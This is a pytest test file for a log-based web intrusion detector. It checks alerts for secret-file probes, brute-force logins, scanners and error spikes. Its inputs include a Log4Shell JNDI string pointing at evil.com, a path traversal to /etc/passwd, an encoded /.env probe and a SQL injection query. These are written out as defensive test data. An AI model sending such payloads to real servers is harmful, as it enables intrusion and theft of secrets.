from datetime import UTC, datetime

from lookout.detector import Detector
from lookout.models import AlertKind, LogEntry


def _entry(
    path: str = "/",
    ip: str = "1.2.3.4",
    status: int = 200,
    ts: datetime | None = None,
) -> LogEntry:
    return LogEntry(
        timestamp=ts or datetime.now(UTC),
        ip=ip,
        method="GET",
        path=path,
        status=status,
        bytes_sent=100,
        user_agent="test",
        source="test",
    )


def test_sensitive_path_probe_is_digest_only():
    d = Detector()
    alerts = d.process(_entry(path="/.env", status=404))
    probe = next(a for a in alerts if a.kind == AlertKind.SENSITIVE_PATH)
    assert probe.immediate is False


def test_sensitive_path_success_is_immediate_hit():
    d = Detector()
    alerts = d.process(_entry(path="/.env", status=200))
    hit = next(a for a in alerts if a.kind == AlertKind.SENSITIVE_HIT)
    assert hit.immediate is True
    # a served secret is not also reported as a mere probe
    assert not any(a.kind == AlertKind.SENSITIVE_PATH for a in alerts)


def test_sensitive_path_wp_admin():
    d = Detector()
    alerts = d.process(_entry(path="/wp-admin/", status=404))
    assert any(a.kind == AlertKind.SENSITIVE_PATH for a in alerts)


def test_normal_path_no_alert():
    d = Detector()
    alerts = d.process(_entry(path="/index.html"))
    assert not alerts


def test_brute_force_threshold():
    d = Detector()
    alerts: list = []
    for _ in range(20):
        alerts.extend(d.process(_entry(path="/login")))
    assert any(a.kind == AlertKind.BRUTE_FORCE for a in alerts)


def test_brute_force_below_threshold():
    d = Detector()
    alerts: list = []
    for _ in range(19):
        alerts.extend(d.process(_entry(path="/login")))
    assert not any(a.kind == AlertKind.BRUTE_FORCE for a in alerts)


def test_scanner_threshold():
    d = Detector()
    alerts: list = []
    for i in range(30):
        alerts.extend(d.process(_entry(path=f"/path/{i}")))
    assert any(a.kind == AlertKind.SCANNER for a in alerts)


def test_error_spike_threshold():
    d = Detector()
    alerts: list = []
    for _ in range(50):
        alerts.extend(d.process(_entry(status=404)))
    assert any(a.kind == AlertKind.ERROR_SPIKE for a in alerts)


def test_error_spike_requires_errors():
    d = Detector()
    alerts: list = []
    for _ in range(50):
        alerts.extend(d.process(_entry(status=200)))
    assert not any(a.kind == AlertKind.ERROR_SPIKE for a in alerts)


def test_multiple_ips_independent():
    d = Detector()
    alerts: list = []
    for i in range(20):
        alerts.extend(d.process(_entry(path="/login", ip=f"10.0.0.{i}")))
    assert not any(a.kind == AlertKind.BRUTE_FORCE for a in alerts)


def test_url_encoded_sensitive_path_detected():
    d = Detector()
    alerts = d.process(_entry(path="/.%65nv", status=404))  # .env with 'e' percent-encoded
    assert any(a.kind == AlertKind.SENSITIVE_PATH for a in alerts)


def test_path_traversal_detected():
    d = Detector()
    alerts = d.process(_entry(path="/static/../../../etc/passwd", status=404))
    assert any(a.kind == AlertKind.SENSITIVE_PATH for a in alerts)


def test_log4shell_detected():
    d = Detector()
    alerts = d.process(_entry(path="/${jndi:ldap://evil.com/x}", status=404))
    assert any(a.kind == AlertKind.SENSITIVE_PATH for a in alerts)


def test_sql_injection_detected():
    d = Detector()
    alerts = d.process(_entry(path="/search?q=1%20union%20select%20*%20from%20users", status=404))
    assert any(a.kind == AlertKind.SENSITIVE_PATH for a in alerts)


def test_brute_force_and_scanner_are_digest_only():
    d = Detector()
    alerts: list = []
    for _ in range(20):
        alerts.extend(d.process(_entry(path="/login", status=401)))
    brute = next(a for a in alerts if a.kind == AlertKind.BRUTE_FORCE)
    assert brute.immediate is False


def test_error_spike_is_immediate_without_ip():
    d = Detector()
    alerts: list = []
    for _ in range(50):
        alerts.extend(d.process(_entry(status=500)))
    spike = next(a for a in alerts if a.kind == AlertKind.ERROR_SPIKE)
    assert spike.immediate is True
    assert spike.ip == "-"


def test_threshold_crossed_only_alerts_once():
    d = Detector()
    alerts: list = []
    for _ in range(25):  # five past the threshold of 20
        alerts.extend(d.process(_entry(path="/login", status=401)))
    assert sum(a.kind == AlertKind.BRUTE_FORCE for a in alerts) == 1


def test_ip_cap_does_not_crash():
    d = Detector(max_tracked_ips=3)
    # Feed more unique IPs than the cap — should not raise and should still detect
    for i in range(10):
        d.process(_entry(path=f"/path/{i}", ip=f"10.0.0.{i}"))
    assert len(d._path_hits) <= 3
